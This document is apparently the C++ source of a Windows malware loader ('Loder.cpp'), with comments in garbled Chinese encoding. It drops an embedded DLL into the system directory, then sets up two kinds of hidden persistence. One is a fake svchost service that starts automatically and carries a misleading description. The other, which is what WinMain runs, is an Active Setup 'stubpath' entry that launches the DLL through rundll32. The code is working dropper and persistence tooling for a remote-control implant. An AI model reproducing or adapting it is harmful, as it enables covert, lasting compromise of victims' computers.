// Loder.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "resource.h"
#include "RegEditEx.h"
#include <objbase.h>
#include <stdio.h>



bool CreateMyFile(char* strFilePath,LPBYTE lpBuffer,DWORD dwSize)
{
	DWORD dwWritten;
	
	HANDLE hFile = CreateFile(strFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hFile != NULL)
	{
		WriteFile(hFile, (LPCVOID)lpBuffer, dwSize, &dwWritten, NULL);
	}
	else
	{
		return false;
	}
	CloseHandle(hFile);
	return true;
}
                       //Ҫ�ͷŵ�·��   ��ԴID            ��Դ��
bool CreateEXE(char* strFilePath,int nResourceID,char* strResourceName)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize;
	LPBYTE p;
	// �����������Դ
	hResInfo = FindResource(NULL, MAKEINTRESOURCE(nResourceID), strResourceName);
	if (hResInfo == NULL)
	{
		//MessageBox(NULL, "������Դʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// �����Դ�ߴ�
	dwSize = SizeofResource(NULL, hResInfo);
	// װ����Դ
	hResData = LoadResource(NULL, hResInfo);
	if (hResData == NULL)
	{
		//MessageBox(NULL, "װ����Դʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// Ϊ���ݷ���ռ�
	p = (LPBYTE)GlobalAlloc(GPTR, dwSize);
	if (p == NULL)
	{
		//MessageBox(NULL, "�����ڴ�ʧ�ܣ�", "����", MB_OK | MB_ICONINFORMATION);
		return false;
	}
	// ������Դ����
	CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);	
	
	bool bRet = CreateMyFile(strFilePath,p,dwSize);
	if(!bRet)
	{
		GlobalFree((HGLOBAL)p);
		return false;
	}
	
	GlobalFree((HGLOBAL)p);
	
	return true;
}


char *AddsvchostService()
{
	char	*lpServiceName = NULL;
	int rc = 0;
	HKEY hkRoot;
    char buff[2048];
	//��װ����svchost��������ע����
    //query svchost setting
    char *ptr, *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
    rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_ALL_ACCESS, &hkRoot);
    if(ERROR_SUCCESS != rc)
        return NULL;
	
    DWORD type, size = sizeof buff;
	//ö�������еķ�����
    rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)buff, &size);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)
        RegCloseKey(hkRoot);
	
	int i = 0;
	bool bExist = false;
	char servicename[50];
	do
	{	
        //���������������ķ�����netsvcs_0��netsvcs_1��������������
		wsprintf(servicename, "netsvcs_0x%d", i);
		for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1)
		{
			//Ȼ��ȶ�һ�·��������Ƿ������������
			if (lstrcmpi(ptr, servicename) == 0)
			{	
				bExist = true;
				break;              //���û�о�����
			}
		}
		if (bExist == false)
			break;
		bExist = false;
		i++;
	} while(1);
	
	servicename[lstrlen(servicename) + 1] = '\0';
	//Ȼ�����������д�����з������ĺ��棬
	//��Ҫ���룬ֱ����api��һ��ע���ļ�ֵ�������һЩ��Ϣ
	memcpy(buff + size - 1, servicename, lstrlen(servicename) + 2);
    //Ȼ�󽫺����·������Ļ�����д��ע���ע�����ԭ�����ݱ�����
    rc = RegSetValueEx(hkRoot, "netsvcs", 0, REG_MULTI_SZ, (unsigned char*)buff, size + lstrlen(servicename) + 1);
	
	RegCloseKey(hkRoot);
	
    SetLastError(rc);
	
	if (bExist == false)
	{
		lpServiceName = new char[lstrlen(servicename) + 1];
		lstrcpy(lpServiceName, servicename);
	}
	//�ص� InstallService
	return lpServiceName;
}

void StartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
		if ( NULL != hService )
		{
			StartService(hService, 0, NULL);
			CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}
}

void ServerSetup()
{
	//copy WinMain
	 //CreateEXE("D:\\123.dll",IDR_DLL,"DLL");
	char *lpServiceDescription="�˷���ΪԶ�̹������������,�����û�а�װ�������,�뽫�˷���ɾ��!";
	char strModulePath[MAX_PATH];
	char	strSysDir[MAX_PATH];
	char strSubKey[1024];
	DWORD	dwStartType = 0;
	char	strRegKey[1024];
	int rc = 0;
    HKEY hkRoot = HKEY_LOCAL_MACHINE, hkParam = 0;
    SC_HANDLE hscm = NULL, schService = NULL;


	 hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	GetSystemDirectory(strSysDir, sizeof(strSysDir));
	char *bin = "%SystemRoot%\\System32\\svchost.exe -k netsvcs";
	char *lpServiceName=AddsvchostService();                             //*��ӵĴ��������������*
	char lpServiceDisplayName[128];
	wsprintf(lpServiceDisplayName,"%s_ms,",lpServiceName);
	//���ﷵ���µķ�������͹������dll������
	memset(strModulePath, 0, sizeof(strModulePath));
	wsprintf(strModulePath, "%s\\%sex.dll", strSysDir, lpServiceName);
	
	//Ȼ��������е�������Ϣ��λ��
	wsprintf(strRegKey, "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
    schService = CreateService(
		hscm,                      // SCManager database
		lpServiceName,                    // name of service
		lpServiceDisplayName,           // service name to display
		SERVICE_ALL_ACCESS,        // desired access
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_AUTO_START,      // start type
		SERVICE_ERROR_NORMAL,      // error control type
		bin,        // service's binary
		NULL,                      // no load ordering group
		NULL,                      // no tag identifier
		NULL,                      // no dependencies
		NULL,                      // LocalSystem account
		NULL);                     // no password
	dwStartType = SERVICE_WIN32_OWN_PROCESS;
	
	if (schService == NULL)
		throw "CreateService(Parameters)";
	
	CloseServiceHandle(schService);
	CloseServiceHandle(hscm);

	hkRoot = HKEY_LOCAL_MACHINE;
	//���ﹹ������������
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	
	if (dwStartType == SERVICE_WIN32_SHARE_PROCESS)
	{		
		DWORD	dwServiceType = 0x120;
		
		//д����������
		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Type", REG_DWORD, (char *)&dwServiceType, sizeof(DWORD), 0);
	}
	//д����������
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Description", REG_SZ, (char *)lpServiceDescription, lstrlen(lpServiceDescription), 0);
	
	lstrcat(strSubKey, "\\Parameters");
	//д����������
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ServiceDll", REG_EXPAND_SZ, (char *)strModulePath, lstrlen(strModulePath), 0);
	
	
	if (schService!=NULL)
	{
        CreateEXE(strModulePath,IDR_DLL,"DLL");
		StartService(lpServiceName);
	}
	RegCloseKey(hkRoot);
	RegCloseKey(hkParam);
	CloseServiceHandle(schService);
	CloseServiceHandle(hscm);


}

BOOL GetNUM(char *num)
{
	CoInitialize(NULL);
	char buf[64] = {0};
	GUID guid;
	if (S_OK == ::CoCreateGuid(&guid))
	{
		_snprintf(buf, sizeof(buf)
			, "{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X}"
			, guid.Data1
			, guid.Data2
			, guid.Data3
			, guid.Data4[0], guid.Data4[1]
			, guid.Data4[2], guid.Data4[3], guid.Data4[4], guid.Data4[5]
			, guid.Data4[6], guid.Data4[7]
			);
	}
	CoUninitialize();
	memcpy(num,buf,64);
	return TRUE;
}

void ActiveXSetup()
{
	HKEY hKey;
	char strFileName[MAX_PATH];           //dll�ļ���
	char ActivexStr[1024];                //���ڴ洢ActiveX�ļ��ִ�
	char ActiveXPath[MAX_PATH];            //ActiveX·��
	char ActiveXKey[64];                   //ActiveX ��GUID�ִ�
    char strCmdLine[MAX_PATH];              //�洢�����������в���
	
	
    ZeroMemory(strFileName,MAX_PATH);
	ZeroMemory(ActiveXPath,MAX_PATH);
	ZeroMemory(ActivexStr,1024);
	ZeroMemory(ActiveXKey,MAX_PATH);
    ZeroMemory(strCmdLine,MAX_PATH);
	
	//�õ�Activex·��
	strcpy(ActiveXPath,"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\");
	//�õ�Activex��GUID
	GetNUM(ActiveXKey);
	//����dll�����ļ���
    GetSystemDirectory(strFileName,MAX_PATH);
	strcat(strFileName,"\\");
	strcat(strFileName,ActiveXKey);
	strcat(strFileName,".dll");


    //����ActiveX��ע����ֵ
	sprintf(ActivexStr,"%s%s",ActiveXPath,ActiveXKey);
	//�������ע���
	RegCreateKey(HKEY_LOCAL_MACHINE,ActivexStr,&hKey);
	
	//������������������в���
	sprintf(strCmdLine,"%s %s,FirstRun","rundll32.exe",strFileName);
	//������д��ע�����
	RegSetValueEx(hKey,"stubpath",0,REG_EXPAND_SZ,(BYTE *)strCmdLine,lstrlen(strCmdLine));
	RegCloseKey(hKey);
    //�ͷ��ļ�
    CreateEXE(strFileName,IDR_DLL,"DLL");
	
	//���������
	STARTUPINFO StartInfo;
	PROCESS_INFORMATION ProcessInformation;
	StartInfo.cb=sizeof(STARTUPINFO);
	StartInfo.lpDesktop=NULL;
	StartInfo.lpReserved=NULL;
	StartInfo.lpTitle=NULL;
	StartInfo.dwFlags=STARTF_USESHOWWINDOW;
	StartInfo.cbReserved2=0;
	StartInfo.lpReserved2=NULL;
	StartInfo.wShowWindow=SW_SHOWNORMAL;
	BOOL bReturn=CreateProcess(NULL,strCmdLine,NULL,NULL,FALSE,NULL,NULL,NULL,&StartInfo,&ProcessInformation);
	return ;
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
    ActiveXSetup();
	return 0;
}



